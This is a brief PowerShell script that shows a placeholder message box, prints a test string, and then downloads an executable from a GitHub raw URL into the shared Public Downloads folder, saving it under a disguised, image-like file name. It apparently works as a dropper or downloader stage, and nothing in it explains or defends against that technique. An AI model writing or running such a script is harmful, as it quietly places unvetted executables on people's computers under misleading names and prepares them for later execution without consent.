Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "This is a simple message with just the default OK button"
[System.Windows.MessageBox]::Show($msgBody)
Write-Output "helllllllllo"
$url = "https://github.com/ededx/simulator/raw/refs/heads/main/test_projet_c++.exe"

# Destation file
$dest = "C:\Users\Public\Downloads\img129001716.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $dest
Start-Sleep -Seconds 10